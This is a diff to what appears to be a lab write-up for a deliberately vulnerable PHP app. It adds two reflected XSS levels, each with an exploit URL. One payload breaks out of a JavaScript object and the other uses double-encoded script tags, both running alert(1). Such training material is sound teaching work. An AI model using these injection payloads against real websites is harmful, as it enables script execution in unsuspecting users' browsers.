@@ -25,3 +25,21 @@
 
 **Impact:** Execute arbitrary Javascript code on Web Browser.
 
+## Level 4
+
+**Vulnerability:** Reflected XSS (Cross Site Scripting)
+
+**Exploit :** `/Vulnerable_code/PHP/XSS/level_4.php?search=e"});alert(1);var a=({"ee":"ee`
+
+**Impact:** Execute arbitrary Javascript code on Web Browser.
+
+
+## Level 5
+
+**Vulnerability:** Reflected XSS (Cross Site Scripting)
+
+**Exploit :** `/Vulnerable_code/PHP/XSS/level_5.php?search=ee%253C/script%253E%253Cscript%253Ealert(1)%3b%253C/script%253E`
+
+**Impact:** Execute arbitrary Javascript code on Web Browser.
+
+
